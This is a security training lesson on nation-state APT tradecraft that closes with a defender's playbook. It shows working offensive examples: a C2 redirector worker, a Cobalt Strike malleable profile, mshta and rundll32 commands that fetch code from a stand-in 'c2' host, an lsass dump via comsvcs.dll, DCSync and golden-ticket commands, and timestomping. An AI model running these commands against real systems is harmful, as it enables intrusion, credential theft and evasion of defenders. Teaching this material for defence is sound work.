# Nation-State Tradecraft

What separates a hobbyist from a state-sponsored operator isn't the exploit — it's the **tradecraft**: how infrastructure is staged, how operations are compartmentalized, how attribution is poisoned, and how access is held quietly for years. This lesson distills public reporting on APT28, APT29, APT41, Lazarus, MuddyWater, Volt Typhoon, and Sandworm.

![APT Lifecycle](/images/lessons/apt_lifecycle_en.png)


> [!warning] Defensive intelligence
> Use this to model real adversaries against your environment. The TTPs are public and have been documented by CISA, Mandiant, Microsoft MSTIC, Volexity, and ESET.

## The four pillars of state tradecraft

| Pillar | What it means in practice |
|--------|--------------------------|
| **Compartmentalization** | Separate teams, separate infra, separate exploits per target — burn one, don't lose all |
| **Patience** | Mean dwell time for state APTs: 200+ days. Move only when needed |
| **Living off the land** | Use built-in OS tools so EDR sees normal admin behavior |
| **Plausible deniability** | False flags, criminal-tool reuse, third-country hops |

## Infrastructure staging

Operators rarely connect directly. A typical chain:

```
operator workstation → VPN provider → tier-1 hop (cloud VPS, anon-paid) →
tier-2 redirector (CDN/legitimate SaaS) → C2 server → victim
```

### Tier-1 — disposable VPSes

```terminal
# Bought with crypto via reseller; never reused across operations.
# Example providers favored in public reporting: Choopa/Vultr, DigitalOcean,
# IPVanish-tier, BulletProof providers in lax jurisdictions.

# Setup hardening:
ufw default deny incoming
ufw allow from <REDIRECTOR_IP> to any port 443
sshd_config: Port 22222 / PasswordAuthentication no / AllowUsers ops
```

### Tier-2 — legitimate-looking redirectors

Ride trusted clouds so beacons blend in.

```terminal
# Cloudflare Worker as redirector — domain fronting, malleable headers
wrangler init c2-redirect
# index.js
addEventListener('fetch', e => {
  const url = new URL(e.request.url);
  url.hostname = 'c2-real-host.tld';
  e.respondWith(fetch(url, e.request));
});

# Azure Front Door / AWS CloudFront equivalents — high-trust SNIs
```

### Domain selection

- **Aged domains** (drop-catch from ≥ 2y old expired domains) — beats new-domain reputation filters.
- **Lookalikes** with valid LE certs.
- **Categorized as benign** by Cisco Talos / Symantec — operators submit pre-burn for re-categorization.

## Malleable C2 — beacon profiles

Cobalt Strike, Sliver, Mythic all support **profile** files that shape network traffic to mimic legitimate apps (Slack, Teams, Office365 telemetry).

```c
# Cobalt Strike Malleable C2 snippet — mimic Office365 telemetry
http-get "/v1/me/photo/$value" {
    client {
        header "User-Agent" "MSWAC";
        header "Authorization" "Bearer eyJ0eXAi...";
        metadata { netbios; base64url; uri-append; }
    }
    server {
        header "Content-Type" "image/jpeg";
        output { netbiosu; print; }
    }
}
```

> [!tip] Detection-engineering inversion
> If you're a defender, **write detections against the malleable profile, not the implant**. The implant changes per op; the profile leaves textual fingerprints (header order, JA3 fingerprint, beacon jitter pattern).

## Living off the land (LOLBAS / LOLBins)

![LOLBAS Proxy Execution](/images/lessons/lolbas_proxy_execution_en.png)


Why drop binaries when Windows ships you a toolkit?

| Goal | Binary | Example |
|------|--------|---------|
| Download + execute | `mshta.exe` | `mshta http://c2/x.hta` |
| Proxy execution | `rundll32.exe` | `rundll32 url.dll,OpenURL http://c2/x.dll` |
| Cred theft | `comsvcs.dll` | `rundll32 C:\windows\system32\comsvcs.dll, MiniDump <pid> lsass.dmp full` |
| Lateral exec | `wmic.exe` / `PsExec` / `WinRM` | `Invoke-Command -ComputerName SRV01 -ScriptBlock {...}` |
| Persistence | `schtasks` / `wevtutil` | scheduled task masquerading as `OneDriveStandalone` |
| Discovery | `nltest`, `net`, `dsquery` | enum domain trusts and admins |

```terminal
# Volt Typhoon-style discovery (full LOLBAS, no third-party tools)
wmic /node:dc01 path win32_ntlogevent where "logfile='Security'" get /value
nltest /domain_trusts /all_trusts
net group "Domain Admins" /domain
quser /server:srv01
```

## Credential & identity tradecraft

State actors live on stolen identities, not exploits. The progression:

1. **Initial creds** from phish or VPN exploit.
2. **Lsass dump** via comsvcs.dll for local NT hashes.
3. **DCSync** (replication rights) → entire NTDS.dit.
4. **Golden Ticket** (krbtgt hash) → eternal forged Kerberos.
5. **Federation backdoor** — forge SAML tokens (e.g., Solorigate) → cloud + on-prem from one key.

```terminal
# DCSync (Impacket)
secretsdump.py -dc-ip 10.0.0.1 corp.local/admin@dc01.corp.local -just-dc-user krbtgt
# Output: krbtgt:NTLM:aad3b435...:5e5a... → forge tickets
ticketer.py -nthash <krbtgt-hash> -domain-sid S-1-5-21-... -domain corp.local Administrator
```

## Persistence at scale

- **AD CS abuse** — issue Smart Card cert for any user (ESC1) → permanent auth bypass.
- **Federation forgery** — replace SAML signing key (Solorigate / Magic Web).
- **Service principal abuse in Azure** — add credentials to existing app, grant Mail.ReadWrite, never expires.
- **Firmware implants** — UEFI bootkits (LoJax, BlackLotus, MoonBounce) survive OS reinstall.
- **Edge-device implants** — Cisco IOS XE (BlackTech), Fortinet (Coathanger), Juniper (J-Magic).

## False flags and attribution poisoning

Public examples:

- **Olympic Destroyer (2018)** included strings linking to Lazarus to fool incident responders.
- **DarkHotel / TigerRAT** reused criminal RAT code so initial reporting attributed to crimeware.
- **Snake (Turla)** uses Russian-language artifacts in some campaigns and English in others.

> [!danger] Attribution is hard, claim it carefully
> Code overlap, language artifacts, and infrastructure reuse can all be planted. Strong attribution requires multi-source intel: SIGINT, HUMINT, financial flow, plus technical. CIRTs should write reports as "TTPs consistent with X" rather than naming an actor without source-of-record.

## Operational tempo

- **Recon**: weeks to months, fully passive.
- **Exploit**: minutes once a target is selected.
- **Internal recon + lateral**: days, deliberate — avoid noisy mass scans.
- **Collection**: weeks. Pull only what was tasked.
- **Exfil**: low-bandwidth, encrypted, often staged through legitimate cloud (OneDrive, Mega, Dropbox) before pulling out.
- **Cleanup**: log wiping, timestomping, backdoor pruning. Many state ops never trigger this — they keep the access for years.

```terminal
# Timestomp a dropped binary to match a benign neighbor
SetMace.exe -p C:\windows\system32\drivers\srvnet.sys.bak -t "2019-12-07 03:21:14"
# Or PowerShell:
(Get-Item C:\path\evil.sys).LastWriteTime = '2019-12-07 03:21:14'
```

## Defender's playbook against state TTPs

1. **Hunt for LOLBAS abuse** — `wmic process call create`, `rundll32` with URL args, `mshta` from non-Office parent.
2. **Detect identity theft** — anomalous Kerberos TGT lifetime, golden-ticket signatures, OAuth apps with rare consent grants.
3. **Restrict edge admin paths** — separate management plane on dedicated jump hosts with PAW (Privileged Access Workstation).
4. **Tier 0 hardening** — ADCS template review (ESC1-15), krbtgt rotation twice, signed SAML certs in HSM.
5. **Tabletop a named adversary every quarter** — pick one APT report, walk it through your environment, fix every gap surfaced.
